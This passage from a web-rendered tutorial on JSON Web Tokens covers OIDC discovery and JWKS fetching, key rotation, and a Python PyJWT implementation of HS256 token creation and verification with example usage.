<a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>    &quot;response_types_supported&quot;: [&quot;code&quot;, &quot;token&quot;],          
<a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a>    ...                                                      
<a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a>  }                                                          
<a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a>                                                             
<a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a>  Step 2: Fetch JWKS                                        
<a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a>                                         
<a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a>  GET https://auth.example.com/jwks.json                    
<a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a>                                                             
<a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a>  Response:                                                  
<a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a>  {                                                          
<a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a>    &quot;keys&quot;: [                                               
<a id="__codelineno-15-26" name="__codelineno-15-26" href="#__codelineno-15-26"></a>      {&quot;kty&quot;: &quot;RSA&quot;, &quot;kid&quot;: &quot;key-1&quot;, &quot;n&quot;: &quot;...&quot;, &quot;e&quot;: &quot;...&quot;} 
<a id="__codelineno-15-27" name="__codelineno-15-27" href="#__codelineno-15-27"></a>    ]                                                        
<a id="__codelineno-15-28" name="__codelineno-15-28" href="#__codelineno-15-28"></a>  }                                                          
<a id="__codelineno-15-29" name="__codelineno-15-29" href="#__codelineno-15-29"></a>                                                             
<a id="__codelineno-15-30" name="__codelineno-15-30" href="#__codelineno-15-30"></a>  Step 3: Verify JWT                                        
<a id="__codelineno-15-31" name="__codelineno-15-31" href="#__codelineno-15-31"></a>                                         
<a id="__codelineno-15-32" name="__codelineno-15-32" href="#__codelineno-15-32"></a>  1. Parse JWT header  get &quot;kid&quot;                           
<a id="__codelineno-15-33" name="__codelineno-15-33" href="#__codelineno-15-33"></a>  2. Find matching key in JWKS                              
<a id="__codelineno-15-34" name="__codelineno-15-34" href="#__codelineno-15-34"></a>  3. Verify signature with public key                       
<a id="__codelineno-15-35" name="__codelineno-15-35" href="#__codelineno-15-35"></a>  4. Validate claims                                        
<a id="__codelineno-15-36" name="__codelineno-15-36" href="#__codelineno-15-36"></a>                                                             
<a id="__codelineno-15-37" name="__codelineno-15-37" href="#__codelineno-15-37"></a>
</code></pre></div>
<h3 id="jwks-key-rotation">JWKS Key Rotation</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>Key Rotation Strategy:
<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>Time: Day 0                    Day 30                  Day 60
<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>                                                       
<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>                                                       
<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>                          
<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>  JWKS                   JWKS                   JWKS    
<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>                                                        
<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a> key-jan    Active     key-jan                key-feb  
<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>                        key-feb    Active     key-mar    Active
<a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>                                                        
<a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>                          
<a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a>
<a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a>Process:
<a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a>1. Generate new key (key-feb) on Day 25
<a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a>2. Add to JWKS alongside old key (key-jan)
<a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a>3. Start signing with new key on Day 30
<a id="__codelineno-16-18" name="__codelineno-16-18" href="#__codelineno-16-18"></a>4. Keep old key for verification (grace period)
<a id="__codelineno-16-19" name="__codelineno-16-19" href="#__codelineno-16-19"></a>5. Remove old key after all JWTs expire (Day 60)
<a id="__codelineno-16-20" name="__codelineno-16-20" href="#__codelineno-16-20"></a>
<a id="__codelineno-16-21" name="__codelineno-16-21" href="#__codelineno-16-21"></a>Benefits:
<a id="__codelineno-16-22" name="__codelineno-16-22" href="#__codelineno-16-22"></a> Zero downtime during rotation
<a id="__codelineno-16-23" name="__codelineno-16-23" href="#__codelineno-16-23"></a> Old JWTs still valid during transition
<a id="__codelineno-16-24" name="__codelineno-16-24" href="#__codelineno-16-24"></a> Security: Limit key exposure window
</code></pre></div>
<hr />
<h2 id="complete-python-implementation">Complete Python Implementation</h2>
<h3 id="installation">Installation</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>pip<span class="w"> </span>install<span class="w"> </span>pyjwt<span class="w"> </span>cryptography
</code></pre></div>
<h3 id="creating-and-verifying-jwts">Creating and Verifying JWTs</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">jwt</span>
<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">datetime</span><span class="w"> </span><span class="kn">import</span> <span class="n">datetime</span><span class="p">,</span> <span class="n">timedelta</span>
<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.primitives</span><span class="w"> </span><span class="kn">import</span> <span class="n">serialization</span>
<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.primitives.asymmetric</span><span class="w"> </span><span class="kn">import</span> <span class="n">rsa</span>
<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.backends</span><span class="w"> </span><span class="kn">import</span> <span class="n">default_backend</span>
<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>
<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="c1"># ============================================================</span>
<a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="c1"># 1. HMAC (HS256) - Symmetric Signing</span>
<a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a><span class="c1"># ============================================================</span>
<a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a>
<a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a><span class="k">class</span><span class="w"> </span><span class="nc">JWTServiceHS256</span><span class="p">:</span>
<a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;JWT service using HMAC-SHA256 (symmetric)&quot;&quot;&quot;</span>
<a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a>
<a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a>    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
<a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">secret</span> <span class="o">=</span> <span class="n">secret_key</span>
<a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">algorithm</span> <span class="o">=</span> <span class="s2">&quot;HS256&quot;</span>
<a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a>
<a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">create_token</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">user_id</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">email</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> 
<a id="__codelineno-18-21" name="__codelineno-18-21" href="#__codelineno-18-21"></a>                    <span class="n">role</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;user&quot;</span><span class="p">,</span> <span class="n">expires_in</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">3600</span><span class="p">):</span>
<a id="__codelineno-18-22" name="__codelineno-18-22" href="#__codelineno-18-22"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<a id="__codelineno-18-23" name="__codelineno-18-23" href="#__codelineno-18-23"></a><span class="sd">        Create a JWT token.</span>
<a id="__codelineno-18-24" name="__codelineno-18-24" href="#__codelineno-18-24"></a>
<a id="__codelineno-18-25" name="__codelineno-18-25" href="#__codelineno-18-25"></a><span class="sd">        Args:</span>
<a id="__codelineno-18-26" name="__codelineno-18-26" href="#__codelineno-18-26"></a><span class="sd">            user_id: Unique user identifier</span>
<a id="__codelineno-18-27" name="__codelineno-18-27" href="#__codelineno-18-27"></a><span class="sd">            email: User email</span>
<a id="__codelineno-18-28" name="__codelineno-18-28" href="#__codelineno-18-28"></a><span class="sd">            role: User role (admin, user, etc.)</span>
<a id="__codelineno-18-29" name="__codelineno-18-29" href="#__codelineno-18-29"></a><span class="sd">            expires_in: Token lifetime in seconds</span>
<a id="__codelineno-18-30" name="__codelineno-18-30" href="#__codelineno-18-30"></a>
<a id="__codelineno-18-31" name="__codelineno-18-31" href="#__codelineno-18-31"></a><span class="sd">        Returns:</span>
<a id="__codelineno-18-32" name="__codelineno-18-32" href="#__codelineno-18-32"></a><span class="sd">            JWT token string</span>
<a id="__codelineno-18-33" name="__codelineno-18-33" href="#__codelineno-18-33"></a><span class="sd">        &quot;&quot;&quot;</span>
<a id="__codelineno-18-34" name="__codelineno-18-34" href="#__codelineno-18-34"></a>        <span class="n">now</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">utcnow</span><span class="p">()</span>
<a id="__codelineno-18-35" name="__codelineno-18-35" href="#__codelineno-18-35"></a>
<a id="__codelineno-18-36" name="__codelineno-18-36" href="#__codelineno-18-36"></a>        <span class="c1"># Define payload claims</span>
<a id="__codelineno-18-37" name="__codelineno-18-37" href="#__codelineno-18-37"></a>        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
<a id="__codelineno-18-38" name="__codelineno-18-38" href="#__codelineno-18-38"></a>            <span class="c1"># Registered claims</span>
<a id="__codelineno-18-39" name="__codelineno-18-39" href="#__codelineno-18-39"></a>            <span class="s2">&quot;iss&quot;</span><span class="p">:</span> <span class="s2">&quot;https://auth.myapp.com&quot;</span><span class="p">,</span>  <span class="c1"># Issuer</span>
<a id="__codelineno-18-40" name="__codelineno-18-40" href="#__codelineno-18-40"></a>            <span class="s2">&quot;sub&quot;</span><span class="p">:</span> <span class="n">user_id</span><span class="p">,</span>                    <span class="c1"># Subject (user ID)</span>
<a id="__codelineno-18-41" name="__codelineno-18-41" href="#__codelineno-18-41"></a>            <span class="s2">&quot;aud&quot;</span><span class="p">:</span> <span class="s2">&quot;https://api.myapp.com&quot;</span><span class="p">,</span>   <span class="c1"># Audience</span>
<a id="__codelineno-18-42" name="__codelineno-18-42" href="#__codelineno-18-42"></a>            <span class="s2">&quot;exp&quot;</span><span class="p">:</span> <span class="n">now</span> <span class="o">+</span> <span class="n">timedelta</span><span class="p">(</span><span class="n">seconds</span><span class="o">=</span><span class="n">expires_in</span><span class="p">),</span>  <span class="c1"># Expiration</span>
<a id="__codelineno-18-43" name="__codelineno-18-43" href="#__codelineno-18-43"></a>            <span class="s2">&quot;iat&quot;</span><span class="p">:</span> <span class="n">now</span><span class="p">,</span>                        <span class="c1"># Issued at</span>
<a id="__codelineno-18-44" name="__codelineno-18-44" href="#__codelineno-18-44"></a>            <span class="s2">&quot;nbf&quot;</span><span class="p">:</span> <span class="n">now</span><span class="p">,</span>                        <span class="c1"># Not before</span>
<a id="__codelineno-18-45" name="__codelineno-18-45" href="#__codelineno-18-45"></a>            <span class="s2">&quot;jti&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;jwt_</span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s2">_</span><span class="si">{</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>  <span class="c1"># JWT ID</span>
<a id="__codelineno-18-46" name="__codelineno-18-46" href="#__codelineno-18-46"></a>
<a id="__codelineno-18-47" name="__codelineno-18-47" href="#__codelineno-18-47"></a>            <span class="c1"># Public claims</span>
<a id="__codelineno-18-48" name="__codelineno-18-48" href="#__codelineno-18-48"></a>            <span class="s2">&quot;email&quot;</span><span class="p">:</span> <span class="n">email</span><span class="p">,</span>
<a id="__codelineno-18-49" name="__codelineno-18-49" href="#__codelineno-18-49"></a>            <span class="s2">&quot;email_verified&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
<a id="__codelineno-18-50" name="__codelineno-18-50" href="#__codelineno-18-50"></a>
<a id="__codelineno-18-51" name="__codelineno-18-51" href="#__codelineno-18-51"></a>            <span class="c1"># Private claims</span>
<a id="__codelineno-18-52" name="__codelineno-18-52" href="#__codelineno-18-52"></a>            <span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="n">role</span><span class="p">,</span>
<a id="__codelineno-18-53" name="__codelineno-18-53" href="#__codelineno-18-53"></a>            <span class="s2">&quot;permissions&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">,</span> <span class="s2">&quot;write&quot;</span><span class="p">]</span> <span class="k">if</span> <span class="n">role</span> <span class="o">==</span> <span class="s2">&quot;admin&quot;</span> <span class="k">else</span> <span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">]</span>
<a id="__codelineno-18-54" name="__codelineno-18-54" href="#__codelineno-18-54"></a>        <span class="p">}</span>
<a id="__codelineno-18-55" name="__codelineno-18-55" href="#__codelineno-18-55"></a>
<a id="__codelineno-18-56" name="__codelineno-18-56" href="#__codelineno-18-56"></a>        <span class="c1"># Create JWT</span>
<a id="__codelineno-18-57" name="__codelineno-18-57" href="#__codelineno-18-57"></a>        <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span>
<a id="__codelineno-18-58" name="__codelineno-18-58" href="#__codelineno-18-58"></a>            <span class="n">payload</span><span class="p">,</span>
<a id="__codelineno-18-59" name="__codelineno-18-59" href="#__codelineno-18-59"></a>            <span class="bp">self</span><span class="o">.</span><span class="n">secret</span><span class="p">,</span>
<a id="__codelineno-18-60" name="__codelineno-18-60" href="#__codelineno-18-60"></a>            <span class="n">algorithm</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">algorithm</span>
<a id="__codelineno-18-61" name="__codelineno-18-61" href="#__codelineno-18-61"></a>        <span class="p">)</span>
<a id="__codelineno-18-62" name="__codelineno-18-62" href="#__codelineno-18-62"></a>
<a id="__codelineno-18-63" name="__codelineno-18-63" href="#__codelineno-18-63"></a>        <span class="k">return</span> <span class="n">token</span>
<a id="__codelineno-18-64" name="__codelineno-18-64" href="#__codelineno-18-64"></a>
<a id="__codelineno-18-65" name="__codelineno-18-65" href="#__codelineno-18-65"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">verify_token</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">token</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">expected_audience</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="kc">None</span><span class="p">):</span>
<a id="__codelineno-18-66" name="__codelineno-18-66" href="#__codelineno-18-66"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<a id="__codelineno-18-67" name="__codelineno-18-67" href="#__codelineno-18-67"></a><span class="sd">        Verify and decode a JWT token.</span>
<a id="__codelineno-18-68" name="__codelineno-18-68" href="#__codelineno-18-68"></a>
<a id="__codelineno-18-69" name="__codelineno-18-69" href="#__codelineno-18-69"></a><span class="sd">        Args:</span>
<a id="__codelineno-18-70" name="__codelineno-18-70" href="#__codelineno-18-70"></a><span class="sd">            token: JWT token string</span>
<a id="__codelineno-18-71" name="__codelineno-18-71" href="#__codelineno-18-71"></a><span class="sd">            expected_audience: Expected audience value</span>
<a id="__codelineno-18-72" name="__codelineno-18-72" href="#__codelineno-18-72"></a>
<a id="__codelineno-18-73" name="__codelineno-18-73" href="#__codelineno-18-73"></a><span class="sd">        Returns:</span>
<a id="__codelineno-18-74" name="__codelineno-18-74" href="#__codelineno-18-74"></a><span class="sd">            Decoded payload dictionary</span>
<a id="__codelineno-18-75" name="__codelineno-18-75" href="#__codelineno-18-75"></a><span class="sd">        &quot;&quot;&quot;</span>
<a id="__codelineno-18-76" name="__codelineno-18-76" href="#__codelineno-18-76"></a>        <span class="k">try</span><span class="p">:</span>
<a id="__codelineno-18-77" name="__codelineno-18-77" href="#__codelineno-18-77"></a>            <span class="c1"># Verify and decode</span>
<a id="__codelineno-18-78" name="__codelineno-18-78" href="#__codelineno-18-78"></a>            <span class="n">payload</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span>
<a id="__codelineno-18-79" name="__codelineno-18-79" href="#__codelineno-18-79"></a>                <span class="n">token</span><span class="p">,</span>
<a id="__codelineno-18-80" name="__codelineno-18-80" href="#__codelineno-18-80"></a>                <span class="bp">self</span><span class="o">.</span><span class="n">secret</span><span class="p">,</span>
<a id="__codelineno-18-81" name="__codelineno-18-81" href="#__codelineno-18-81"></a>                <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">algorithm</span><span class="p">],</span>
<a id="__codelineno-18-82" name="__codelineno-18-82" href="#__codelineno-18-82"></a>                <span class="n">audience</span><span class="o">=</span><span class="n">expected_audience</span><span class="p">,</span>
<a id="__codelineno-18-83" name="__codelineno-18-83" href="#__codelineno-18-83"></a>                <span class="n">options</span><span class="o">=</span><span class="p">{</span>
<a id="__codelineno-18-84" name="__codelineno-18-84" href="#__codelineno-18-84"></a>                    <span class="s2">&quot;verify_signature&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
<a id="__codelineno-18-85" name="__codelineno-18-85" href="#__codelineno-18-85"></a>                    <span class="s2">&quot;verify_exp&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
<a id="__codelineno-18-86" name="__codelineno-18-86" href="#__codelineno-18-86"></a>                    <span class="s2">&quot;verify_nbf&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
<a id="__codelineno-18-87" name="__codelineno-18-87" href="#__codelineno-18-87"></a>                    <span class="s2">&quot;verify_iat&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
<a id="__codelineno-18-88" name="__codelineno-18-88" href="#__codelineno-18-88"></a>                    <span class="s2">&quot;verify_aud&quot;</span><span class="p">:</span> <span class="kc">True</span> <span class="k">if</span> <span class="n">expected_audience</span> <span class="k">else</span> <span class="kc">False</span>
<a id="__codelineno-18-89" name="__codelineno-18-89" href="#__codelineno-18-89"></a>                <span class="p">}</span>
<a id="__codelineno-18-90" name="__codelineno-18-90" href="#__codelineno-18-90"></a>            <span class="p">)</span>
<a id="__codelineno-18-91" name="__codelineno-18-91" href="#__codelineno-18-91"></a>
<a id="__codelineno-18-92" name="__codelineno-18-92" href="#__codelineno-18-92"></a>            <span class="k">return</span> <span class="p">{</span>
<a id="__codelineno-18-93" name="__codelineno-18-93" href="#__codelineno-18-93"></a>                <span class="s2">&quot;valid&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
<a id="__codelineno-18-94" name="__codelineno-18-94" href="#__codelineno-18-94"></a>                <span class="s2">&quot;payload&quot;</span><span class="p">:</span> <span class="n">payload</span>
<a id="__codelineno-18-95" name="__codelineno-18-95" href="#__codelineno-18-95"></a>            <span class="p">}</span>
<a id="__codelineno-18-96" name="__codelineno-18-96" href="#__codelineno-18-96"></a>
<a id="__codelineno-18-97" name="__codelineno-18-97" href="#__codelineno-18-97"></a>        <span class="k">except</span> <span class="n">jwt</span><span class="o">.</span><span class="n">ExpiredSignatureError</span><span class="p">:</span>
<a id="__codelineno-18-98" name="__codelineno-18-98" href="#__codelineno-18-98"></a>            <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;valid&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Token has expired&quot;</span><span class="p">}</span>
<a id="__codelineno-18-99" name="__codelineno-18-99" href="#__codelineno-18-99"></a>
<a id="__codelineno-18-100" name="__codelineno-18-100" href="#__codelineno-18-100"></a>        <span class="k">except</span> <span class="n">jwt</span><span class="o">.</span><span class="n">InvalidTokenError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
<a id="__codelineno-18-101" name="__codelineno-18-101" href="#__codelineno-18-101"></a>            <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;valid&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)}</span>
<a id="__codelineno-18-102" name="__codelineno-18-102" href="#__codelineno-18-102"></a>
<a id="__codelineno-18-103" name="__codelineno-18-103" href="#__codelineno-18-103"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">decode_without_verification</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">token</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
<a id="__codelineno-18-104" name="__codelineno-18-104" href="#__codelineno-18-104"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;Decode token without verifying (for debugging)&quot;&quot;&quot;</span>
<a id="__codelineno-18-105" name="__codelineno-18-105" href="#__codelineno-18-105"></a>        <span class="k">return</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">options</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;verify_signature&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">})</span>
<a id="__codelineno-18-106" name="__codelineno-18-106" href="#__codelineno-18-106"></a>
<a id="__codelineno-18-107" name="__codelineno-18-107" href="#__codelineno-18-107"></a>
<a id="__codelineno-18-108" name="__codelineno-18-108" href="#__codelineno-18-108"></a><span class="c1"># Example Usage: HS256</span>
<a id="__codelineno-18-109" name="__codelineno-18-109" href="#__codelineno-18-109"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
<a id="__codelineno-18-110" name="__codelineno-18-110" href="#__codelineno-18-110"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;HMAC-SHA256 (HS256) Example&quot;</span><span class="p">)</span>
<a id="__codelineno-18-111" name="__codelineno-18-111" href="#__codelineno-18-111"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
<a id="__codelineno-18-112" name="__codelineno-18-112" href="#__codelineno-18-112"></a>
<a id="__codelineno-18-113" name="__codelineno-18-113" href="#__codelineno-18-113"></a><span class="n">jwt_service</span> <span class="o">=</span> <span class="n">JWTServiceHS256</span><span class="p">(</span><span class="n">secret_key</span><span class="o">=</span><span class="s2">&quot;my-super-secret-key-keep-this-safe&quot;</span><span class="p">)</span>
<a id="__codelineno-18-114" name="__codelineno-18-114" href="#__codelineno-18-114"></a>
<a id="__codelineno-18-115" name="__codelineno-18-115" href="#__codelineno-18-115"></a><span class="c1"># Create token</span>
<a id="__codelineno-18-116" name="__codelineno-18-116" href="#__codelineno-18-116"></a><span class="n">token</span> <span class="o">=</span> <span class="n">jwt_service</span><span class="o">.</span><span class="n">create_token</span><span class="p">(</span>
<a id="__codelineno-18-117" name="__codelineno-18-117" href="#__codelineno-18-117"></a>    <span class="n">user_id</span><span class="o">=</span><span class="s2">&quot;user_12345&quot;</span><span class="p">,</span>
<a id="__codelineno-18-118" name="__codelineno-18-118" href="#__codelineno-18-118"></a>    <span class="n">email</span><span class="o">=</span><span class="s2">&quot;john@example.com&quot;</span><span class="p">,</span>
<a id="__codelineno-18-119" name="__codelineno-18-119" href="#__codelineno-18-119"></a>    <span class="n">role</span><span class="o">=</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span>
<a id="__codelineno-18-120" name="__codelineno-18-120" href="#__codelineno-18-120"></a>    <span class="n">expires_in</span><span class="o">=</span><span class="mi">3600</span>  <span class="c1"># 1 hour</span>
<a id="__codelineno-18-121" name="__codelineno-18-121" href="#__codelineno-18-121"></a><span class="p">)</span>
<a id="__codelineno-18-122" name="__codelineno-18-122" href="#__codelineno-18-122"></a>
<a id="__codelineno-18-123" name="__codelineno-18-123" href="#__codelineno-18-123"></a><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2"> Generated JWT:</span><span class="se">\n</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-18-124" name="__codelineno-18-124" href="#__codelineno-18-124"></a>
<a id="__codelineno-18-125" name="__codelineno-18-125" href="#__codelineno-18-125"></a><span class="c1"># Decode header and payload (without verification)</span>
<a id="__codelineno-18-126" name="__codelineno-18-126" href="#__codelineno-18-126"></a><span class="n">parts</span> <span class="o">=</span> <span class="n">token</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
<a id="__codelineno-18-127" name="__codelineno-18-127" href="#__codelineno-18-127"></a><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Parts: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span><span class="si">}</span><span class="s2"> (Header.Payload.Signature)</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-18-128" name="__codelineno-18-128" href="#__codelineno-18-128"></a>
<a id="__codelineno-18-129" name="__codelineno-18-129" href="#__codelineno-18-129"></a><span class="c1"># Verify token</span>
<a id="__codelineno-18-130" name="__codelineno-18-130" href="#__codelineno-18-130"></a><span class="n">result</span> <span class="o">=</span> <span class="n">jwt_service</span><span class="o">.</span><span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">expected_audience</span><span class="o">=</span><span class="s2">&quot;https://api.myapp.com&quot;</span><span class="p">)</span>
<a id="__codelineno-18-131" name="__codelineno-18-131" href="#__codelineno-18-131"></a><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot; Verification Result:&quot;</span><span class="p">)</span>
<a id="__codelineno-18-132" name="__codelineno-18-132" href="#__codelineno-18-132"></a><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Valid: </span><span class="si">{</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;valid&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-18-133" name="__codelineno-18-133" href="#__codelineno-18-133"></a><span class="k">if</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;valid&#39;</span><span class="p">]:</span>
<a id="__codelineno-18-134" name="__codelineno-18-134" href="#__codelineno-18-134"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;User ID: </span><span class="si">{</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;payload&#39;</span><span class="p">][</span><span class="s1">&#39;sub&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-18-135" name="__codelineno-18-135" href="#__codelineno-18-135"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Email: </span><span class="si">{</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;payload&#39;</span><span class="p">][</span><span class="s1">&#39;email&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
